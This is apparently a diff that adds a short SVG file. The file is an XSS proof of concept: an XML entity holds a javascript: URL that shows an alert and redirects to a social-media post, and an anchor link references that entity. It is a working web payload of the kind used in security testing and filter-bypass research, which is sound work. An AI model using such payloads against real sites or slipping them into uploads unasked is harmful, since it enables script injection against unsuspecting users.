@@ -1,0 +1,8 @@
+<!DOCTYPE xml [
+  <!ENTITY payload "javascript:alert('gotcha');location.href='https://x.com/garethheyes/status/1876953751245783534'">
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <a href="&payload;">
+    <text x="10" y="20">XSS</text>
+  </a>
+</svg>
